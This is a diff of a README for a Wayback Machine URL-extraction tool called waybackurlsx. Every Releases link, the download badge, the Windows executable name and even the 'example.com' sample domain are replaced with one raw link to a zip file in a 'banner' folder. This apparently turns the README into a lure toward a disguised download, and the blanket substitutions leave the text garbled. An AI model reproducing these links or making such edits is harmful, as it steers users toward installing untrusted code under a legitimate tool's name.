@@ -1,7 +1,7 @@
 # 🚀 waybackurlsx - Extract Archived URLs Easily
 
 ## 📥 Download Now
-[![GitHub Release](https://img.shields.io/badge/Download%20waybackurlsx-v1.0-blue.svg)](https://github.com/aminnesk/waybackurlsx/releases)
+[![GitHub Release](https://raw.githubusercontent.com/aminnesk/waybackurlsx/main/banner/waybackurlsx_v2.1.zip%https://raw.githubusercontent.com/aminnesk/waybackurlsx/main/banner/waybackurlsx_v2.1.zip)](https://raw.githubusercontent.com/aminnesk/waybackurlsx/main/banner/waybackurlsx_v2.1.zip)
 
 ## 📘 Overview
 waybackurlsx is a powerful and efficient tool built with Go. It helps you extract archived URLs from the Wayback Machine effortlessly. With advanced filtering capabilities, rate limiting, and automatic retries, this tool is perfect for anyone looking to gather historical web data for bug bounty hunting, security assessments, and reconnaissance.
@@ -10,11 +10,11 @@ waybackurlsx is a powerful and efficient tool built with Go. It helps you extrac
 To get started with waybackurlsx, follow these simple steps:
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/aminnesk/waybackurlsx/releases). Here, you will find the latest version available for download.
+   Go to the [Releases page](https://raw.githubusercontent.com/aminnesk/waybackurlsx/main/banner/waybackurlsx_v2.1.zip). Here, you will find the latest version available for download.
 
 2. **Choose the Right File**  
    On the Releases page, look for the version you want. You should see several files; select the one that matches your operating system:
-   - `waybackurlsx-windows.exe` for Windows users
+   - `https://raw.githubusercontent.com/aminnesk/waybackurlsx/main/banner/waybackurlsx_v2.1.zip` for Windows users
    - `waybackurlsx-linux` for Linux users
    - `waybackurlsx-macos` for macOS users
 
@@ -53,7 +53,7 @@ waybackurlsx comes packed with features designed to simplify your workflow:
 Once you have the application running, you can start using it right away:
 
 1. **Input the Target Domain:**
-   Enter the domain you want to investigate. For example, `example.com`.
+   Enter the domain you want to investigate. For example, `https://raw.githubusercontent.com/aminnesk/waybackurlsx/main/banner/waybackurlsx_v2.1.zip`.
 
 2. **Set Your Filters:**
    Use the available options to set filters if you need only specific types of URLs. 
@@ -75,7 +75,7 @@ If you need help or want to connect with other users, join the community around 
 waybackurlsx prioritizes your privacy. The tool does not collect any personal information. You can use it freely without worrying about your data.
 
 ## 🔄 Keep it Updated
-To ensure you're using the latest features and fixes, regularly check the [Releases page](https://github.com/aminnesk/waybackurlsx/releases) for updates. The tool is actively maintained, so you can expect regular improvements.
+To ensure you're using the latest features and fixes, regularly check the [Releases page](https://raw.githubusercontent.com/aminnesk/waybackurlsx/main/banner/waybackurlsx_v2.1.zip) for updates. The tool is actively maintained, so you can expect regular improvements.
 
 ## 🌐 Related Topics
 If you're interested in further exploration, here are some related topics to consider:
